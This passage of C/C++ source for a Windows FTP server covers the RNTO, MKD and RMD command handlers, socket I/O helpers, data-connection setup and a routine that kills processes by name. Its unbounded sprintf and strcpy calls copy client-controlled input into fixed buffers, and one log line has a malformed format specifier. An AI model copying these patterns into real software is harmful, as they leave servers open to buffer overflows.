			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else if(strRnFr.length() == 0){
				SocketSendString(sCmd, "503 Bad sequence of commands. Send RNFR first.\r\n");
			}else {
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				if(pVFS->MoveFile(strRnFr.c_str(), strNewVirtual.c_str())){
					SocketSendString(sCmd, "250 RNTO command successful\r\n");
					if(isLog){
						sprintf(szOutput, "[%u] renamed file %s to %", sCmd, strRnFr.c_str(), strNewVirtual.c_str());
						pLog->Log(szOutput);
					}
					strRnFr.clear();
				}else{
					sprintf(szOutput, "553 %s: Unable to rename file\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}
			}
		}

		else if(!strcmp(szCmd, "MKD") || !strcmp(szCmd, "XMKD")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if (!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				if(pVFS->CreateDirectory(strNewVirtual.c_str())){
					sprintf(szOutput, "250 %s created successfully.\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
					if(isLog){
						sprintf(szOutput, "[%u] created directory %s", sCmd, strNewVirtual.c_str());
						pLog->Log(szOutput);
					}
				}else{
					sprintf(szOutput, "550 %s: Unable to create directory\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}
			}
		}

		else if(!strcmp(szCmd, "RMD") || !strcmp(szCmd, "XRMD")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				if(pVFS->RemoveDirectory(strNewVirtual.c_str())){
					sprintf(szOutput, "250 %s removed successfully\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
					if(isLog){
						sprintf(szOutput, "[%u] removed directory %s", sCmd, strNewVirtual.c_str());
						pLog->Log(szOutput);
					}
				}else{
					sprintf(szOutput, "550 %s: Unable to remove directory\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}
			}
		}

		else{
			SocketSendString(sCmd, "500 Unknown command\r\n");
			if(isLog){
				sprintf(szOutput, "[%u] unknown command %s", sCmd, pszParam);
				pLog->Log(szOutput);
			}
		}

	}

	if(sPasv){
		closesocket(sPasv);
	}
	closesocket(sCmd);

	if(isLoggedIn){
		dwActiveConnections--;
	}

	delete pVFS;

	sprintf(szOutput, "[%u] connection closed", sCmd);
	if(isLog){
		pLog->Log(szOutput);
	}

	return false;
}

bool SocketSendString(SOCKET s, const char *psz){
	if(send(s, psz, (INT)strlen(psz), 0) == SOCKET_ERROR){
		return false;
	}else{
        	return true;
	}
}

DWORD SocketReceiveString(SOCKET s, char *psz, DWORD dwMaxChars){
	DWORD dw, dwBytes;
	TIMEVAL tv;
	fd_set fds;

	tv.tv_sec = dwCommandTimeout;
	tv.tv_usec = 0;
	for(dwBytes=0;;dwBytes++){
		FD_ZERO(&fds);
		FD_SET(s, &fds);
		dw=select(0, &fds, 0, 0, &tv);
		if(dw == SOCKET_ERROR || dw == 0) return -1;
		dw = recv(s, psz, 1, 0);
		if(dw == SOCKET_ERROR || dw == 0) return -1;
		if(*psz == '\r') *psz = 0;
		else if(*psz == '\n'){
			*psz = 0;
			return dwBytes;
		}
		if(dwBytes<dwMaxChars){
			psz++;
		}
	}
}

DWORD SocketReceiveData(SOCKET s, char *psz, DWORD dwBytesToRead){
	DWORD dw;
	TIMEVAL tv;
	fd_set fds;

	tv.tv_sec = dwConnectTimeout;
	tv.tv_usec = 0;
	FD_ZERO(&fds);
	FD_SET(s, &fds);
	dw = select(0, &fds, 0, 0, &tv);
	if(dw == SOCKET_ERROR || dw == 0){
		return -1;
	}
	dw = recv(s, psz, dwBytesToRead, 0);
	if(dw == SOCKET_ERROR){
		return -1;
	}
	return dw;
}

SOCKET EstablishDataConnection(SOCKADDR_IN *psaiData, SOCKET *psPasv){
	SOCKET sData;
	DWORD dw;
	TIMEVAL tv;
	fd_set fds;

	if(psPasv && *psPasv){
		tv.tv_sec = dwConnectTimeout;
		tv.tv_usec = 0;
		FD_ZERO(&fds);
		FD_SET(*psPasv, &fds);
		dw = select(0, &fds, 0, 0, &tv);
		if(dw && dw != SOCKET_ERROR){
			dw = sizeof(SOCKADDR_IN);
			sData = accept(*psPasv, (SOCKADDR *)psaiData, (int *)&dw);
		}else{
			sData = 0;
		}
		closesocket(*psPasv);
		*psPasv = 0;
		return sData;
	}else{
		sData = socket(AF_INET,SOCK_STREAM, IPPROTO_TCP);
		if(connect(sData, (SOCKADDR *)psaiData, sizeof(SOCKADDR_IN))){
			closesocket(sData);
			return false;
		}else{
			return sData;
		}
	}
}

BOOL KillProcessByName(char *szProcessToKill){
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if(hProcessSnap == INVALID_HANDLE_VALUE){
		return( FALSE );
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if(!Process32First(hProcessSnap, &pe32)){
		CloseHandle(hProcessSnap);
		return( FALSE );
	}

	do{
		if(!strcmp(pe32.szExeFile,szProcessToKill)){
			hProcess = OpenProcess(PROCESS_TERMINATE,0, pe32.th32ProcessID);
			TerminateProcess(hProcess,0);
			CloseHandle(hProcess);
		}
	}while(Process32Next(hProcessSnap,&pe32));

	CloseHandle(hProcessSnap);
	return(1);
}

bool DoSocketFileIO(SOCKET sCmd, SOCKET sData, HANDLE hFile, DWORD dwDirection, DWORD *pdwAbortFlag){
	char szBuffer[PACKET_SIZE];
	DWORD dw;

	if(pdwAbortFlag){
	    *pdwAbortFlag = 0;
	}

	switch(dwDirection){
		case SOCKET_FILE_IO_DIRECTION_SEND:
			for(;;){
				if(!ReadFile(hFile, szBuffer, PACKET_SIZE, &dw, 0)){
				    return false;
				}
				if(!dw){
				    return true;
				}
				if(send(sData, szBuffer, dw, 0) == SOCKET_ERROR){
				    return false;
				}
				ioctlsocket(sCmd, FIONREAD, &dw);
				if(dw){
					SocketReceiveString(sCmd, szBuffer, 511);
					if(!strcmp(szBuffer, "ABOR")){
						*pdwAbortFlag = 1;
						return false;
					}else{
						SocketSendString(sCmd, "500 Only command allowed at this time is ABOR\r\n");
					}
				}
			}
			break;
		case SOCKET_FILE_IO_DIRECTION_RECEIVE:
			for(;;){
				dw = SocketReceiveData(sData, szBuffer, PACKET_SIZE);
				if(dw == -1){
				    return false;
				}
				if(dw == 0){
				    return true;
				}
				if(!WriteFile(hFile, szBuffer, dw, &dw, 0)){
				    return false;
				}
			}
			break;
		default:
			return false;
	}
}

void LookupHost(IN_ADDR ia, char *pszHostName){
	HOSTENT *phe;

	phe = gethostbyaddr((const char *)&ia, sizeof(IN_ADDR), AF_INET);
	if(phe) strcpy(pszHostName, phe->h_name);

	if(!phe){
		strcpy(pszHostName, inet_ntoa(ia));
	}
}
